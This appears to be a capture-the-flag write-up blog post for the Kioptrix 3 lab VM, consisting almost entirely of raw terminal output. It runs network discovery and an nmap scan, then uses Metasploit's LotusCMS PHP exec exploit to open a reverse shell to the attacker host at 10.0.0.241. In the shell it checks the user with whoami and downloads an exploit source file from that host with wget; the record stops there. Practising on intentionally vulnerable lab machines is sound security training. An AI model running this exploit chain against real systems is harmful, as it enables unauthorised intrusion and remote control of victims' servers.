---
layout: single
title: Kioptrix 3!
---

summer@kali:~$ sudo netdiscover -i eth0 -r 10.0.0./24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                     
                                                                                                   
 7 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 420                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        18:9c:27:b2:74:fd      1      60  ARRIS Group, Inc.
 10.0.0.77       14:4f:8a:d6:05:a1      1      60  Intel Corporate                                 
 10.0.0.26       34:4d:f7:5e:dd:60      1      60  LG Electronics (Mobile Communications)          
 10.0.0.174      94:65:2d:8c:2f:7f      1      60  OnePlus Technology (Shenzhen) Co., Ltd          
 10.0.0.236      00:0c:29:4b:25:d5      1      60  VMware, Inc.                                    
 10.0.0.232      14:10:9f:e6:43:99      1      60  Apple, Inc.                                     
 10.0.0.254      18:9c:27:b2:74:fe      1      60  ARRIS Group, Inc.  




Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-16 22:47 EST
Nmap scan report for 10.0.0.236
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 00:0C:29:4B:25:D5 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




msf > use exploit/multi/http/lcms_php_exec 
msf exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf exploit(multi/http/lcms_php_exec) > set RHOST 10.0.0.236
RHOST => 10.0.0.236
msf exploit(multi/http/lcms_php_exec) > set RPORT 80
RPORT => 80
msf exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf exploit(multi/http/lcms_php_exec) > set payload generic/shell_reverse_tcp 
payload => generic/shell_reverse_tcp
msf exploit(multi/http/lcms_php_exec) > exploit

[-] Exploit failed: The following options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf exploit(multi/http/lcms_php_exec) > set LHOST 10.0.0.241
LHOST => 10.0.0.241
msf exploit(multi/http/lcms_php_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.241:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 1 opened (10.0.0.241:4444 -> 10.0.0.236:54037) at 2018-12-16 23:01:40 -0500

whoami
www-data

wget http://10.0.0.241:8000/exploit.c

